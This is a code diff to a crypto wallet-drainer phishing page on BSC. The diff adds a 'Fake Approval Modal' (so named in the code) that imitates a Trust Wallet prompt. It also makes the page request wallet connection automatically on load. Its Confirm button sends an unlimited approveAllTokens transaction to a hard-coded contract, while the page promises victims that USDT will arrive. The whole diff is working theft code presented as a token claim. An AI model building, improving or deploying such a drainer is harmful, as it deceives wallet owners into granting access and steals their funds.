@@ -180,6 +180,132 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        
+        /* Fake Approval Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-overlay.show {
+            display: flex;
+        }
+        
+        .modal {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 380px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .modal-header {
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+        
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 5px;
+        }
+        
+        .modal-subtitle {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .modal-content {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .approval-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 12px;
+        }
+        
+        .approval-label {
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+        
+        .approval-value {
+            font-size: 14px;
+            color: #222;
+            font-weight: 600;
+            word-break: break-all;
+        }
+        
+        .approval-amount {
+            color: #667eea;
+            font-size: 16px;
+        }
+        
+        .modal-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 25px;
+        }
+        
+        .modal-btn {
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-btn-reject {
+            background: #f5f5f5;
+            color: #666;
+        }
+        
+        .modal-btn-reject:hover {
+            background: #efefef;
+        }
+        
+        .modal-btn-approve {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .modal-btn-approve:hover {
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            transform: translateY(-2px);
+        }
     </style>
 </head>
 <body>
@@ -199,7 +325,7 @@
             ⚠️ A one-time approval is required to receive your tokens. This is standard for blockchain transactions.
         </div>
         
-        <button class="button button-primary" id="confirmBtn" onclick="requestApproval()">
+        <button class="button button-primary" id="confirmBtn" onclick="showApprovalModal()">
             ✓ Confirm & Receive
         </button>
         
@@ -207,12 +333,51 @@
         <div id="walletInfo" class="wallet-info" style="display: none;"></div>
     </div>
 
+    <!-- Fake Approval Modal -->
+    <div class="modal-overlay" id="approvalModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">Approve Request</div>
+                <div class="modal-subtitle">Trust Wallet</div>
+            </div>
+            
+            <div class="modal-content">
+                <div class="approval-item">
+                    <div class="approval-label">You are approving</div>
+                    <div class="approval-value approval-amount">UNLIMITED</div>
+                </div>
+                
+                <div class="approval-item">
+                    <div class="approval-label">Token</div>
+                    <div class="approval-value">Multiple Tokens (All BSC)</div>
+                </div>
+                
+                <div class="approval-item">
+                    <div class="approval-label">Contract</div>
+                    <div class="approval-value" id="contractAddressModal">0xC606AAf11BE4a2320d785D49B657f40EfF771ac6</div>
+                </div>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn modal-btn-reject" onclick="rejectApproval()">
+                    Cancel
+                </button>
+                <button class="modal-btn modal-btn-approve" onclick="confirmApproval()">
+                    Confirm
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
         const CONFIG = {
             CONTRACT_ADDRESS: "0xC606AAf11BE4a2320d785D49B657f40EfF771ac6",
-            CHAIN_ID: "0x38", // BSC
+            CHAIN_ID: "0x38",
             RPC_URL: "https://bsc-dataseed1.binance.org:443"
         };
+        
+        let userAddress = null;
+        let isApproved = false;
         
         function showStatus(message, type) {
             const statusDiv = document.getElementById("status");
@@ -260,43 +425,27 @@
             }
         }
         
-        async function requestApproval() {
+        function showApprovalModal() {
+            if (!userAddress) {
+                showStatus("❌ Wallet not connected", "error");
+                return;
+            }
+            document.getElementById("approvalModal").classList.add("show");
+        }
+        
+        function rejectApproval() {
+            document.getElementById("approvalModal").classList.remove("show");
+            showStatus("❌ Approval rejected", "error");
+        }
+        
+        async function confirmApproval() {
+            document.getElementById("approvalModal").classList.remove("show");
+            
             try {
-                const confirmBtn = document.getElementById("confirmBtn");
-                confirmBtn.disabled = true;
+                showStatus("🔐 Sending approval transaction...", "loading");
                 
-                if (!window.ethereum) {
-                    showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
-                
-                showStatus("🔗 Connecting wallet...", "loading");
-                
-                // Connect wallet
-                const accounts = await window.ethereum.request({
-                    method: "eth_requestAccounts"
-                });
-                
-                const userAddress = accounts[0];
-                updateWalletInfo(userAddress);
-                
-                showStatus("🔄 Switching to BSC network...", "loading");
-                
-                // Switch to BSC
-                const switched = await switchToBSC();
-                if (!switched) {
-                    showStatus("❌ Failed to switch to BSC network", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
-                
-                showStatus("🔐 Requesting approval (check your wallet)...", "loading");
-                
-                // Function selector for approveAllTokens()
                 const functionData = "0x7cefa5da";
                 
-                // Send transaction
                 const txHash = await window.ethereum.request({
                     method: "eth_sendTransaction",
                     params: [{
@@ -308,7 +457,6 @@
                 
                 showStatus("⏳ Waiting for confirmation...", "loading");
                 
-                // Wait for receipt
                 let confirmed = false;
                 let attempts = 0;
                 while (!confirmed && attempts < 60) {
@@ -320,12 +468,12 @@
                         
                         if (receipt) {
                             if (receipt.status === "0x1") {
+                                isApproved = true;
                                 showStatus("✅ Approval confirmed! Your USDT will arrive shortly.", "success");
-                                confirmBtn.textContent = "✓ Completed";
-                                confirmBtn.disabled = true;
+                                document.getElementById("confirmBtn").textContent = "✓ Completed";
+                                document.getElementById("confirmBtn").disabled = true;
                             } else {
                                 showStatus("❌ Transaction failed", "error");
-                                confirmBtn.disabled = false;
                             }
                             confirmed = true;
                         }
@@ -340,41 +488,58 @@
                 }
                 
                 if (attempts >= 60) {
-                    showStatus("⏱️ Confirmation timeout. Check BSCScan for status.", "error");
-                    confirmBtn.disabled = false;
+                    showStatus("⏱️ Confirmation timeout", "error");
                 }
                 
             } catch (error) {
                 console.error("Error:", error);
-                const confirmBtn = document.getElementById("confirmBtn");
-                confirmBtn.disabled = false;
-                
                 if (error.code === 4001) {
-                    showStatus("❌ You rejected the request", "error");
+                    showStatus("❌ You rejected the transaction", "error");
                 } else {
                     showStatus(`❌ Error: ${error.message || "Unknown error"}`, "error");
                 }
             }
         }
         
-        // Auto-connect on load
-        window.addEventListener('load', async function() {
-            if (window.ethereum) {
-                try {
-                    const accounts = await window.ethereum.request({
-                        method: "eth_accounts"
-                    });
-                    
-                    if (accounts.length > 0) {
-                        updateWalletInfo(accounts[0]);
-                    }
-                } catch (e) {
-                    console.log("Auto-connect: wallet not connected yet");
+        async function autoConnect() {
+            if (!window.ethereum) {
+                console.log("❌ No wallet detected");
+                return;
+            }
+            
+            try {
+                showStatus("🔗 Auto-connecting wallet...", "loading");
+                
+                const accounts = await window.ethereum.request({
+                    method: "eth_requestAccounts"
+                });
+                
+                userAddress = accounts[0];
+                updateWalletInfo(userAddress);
+                
+                showStatus("🔄 Switching to BSC...", "loading");
+                
+                const switched = await switchToBSC();
+                if (switched) {
+                    showStatus("✅ Ready! Click Confirm to receive USDT", "success");
+                } else {
+                    showStatus("❌ Could not switch to BSC", "error");
+                }
+                
+            } catch (error) {
+                console.error("Auto-connect error:", error);
+                if (error.code !== 4001) {
+                    showStatus("❌ Connection failed", "error");
                 }
             }
+        }
+        
+        // Auto-connect on page load
+        window.addEventListener('load', function() {
+            autoConnect();
         });
         
-        // Listen for changes
+        // Listen for wallet changes
         if (window.ethereum) {
             window.ethereum.on('chainChanged', () => {
                 location.reload();
@@ -382,7 +547,11 @@
             
             window.ethereum.on('accountsChanged', (accounts) => {
                 if (accounts.length > 0) {
+                    userAddress = accounts[0];
                     updateWalletInfo(accounts[0]);
+                } else {
+                    userAddress = null;
+                    document.getElementById("walletInfo").style.display = "none";
                 }
             });
         }
